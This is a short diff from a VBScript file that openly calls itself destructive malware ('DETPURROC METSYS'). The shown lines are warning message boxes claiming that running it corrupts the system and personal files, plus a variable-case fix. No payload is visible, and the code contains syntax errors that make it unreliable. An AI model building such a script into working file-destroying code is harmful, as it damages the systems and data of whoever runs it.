@@ -2,13 +2,13 @@ Dim SYSTEM
 SYSTEM=Msgbox("You'd run a software called DETPURROC METSYS that's a malware, if you doesn't know what it is just close this and restart your system. Warning: Executing will corrupt your system and personal files. Am I not responsible for any damages."),vbYesNo + vbExclamation, ("DETPURROC METSYS by AlexVirusCiberneticos or CyberAlexMalw")
 
 
-Select Case System
+Select Case SYSTEM
 
 Case vbYes
 
 Msgbox ("are ya really sure u want to run this malware this the last warnin"),0+48,("LAST WARNING")
 
-End System
+End SYSTEM
 
 Dim Fuck
 
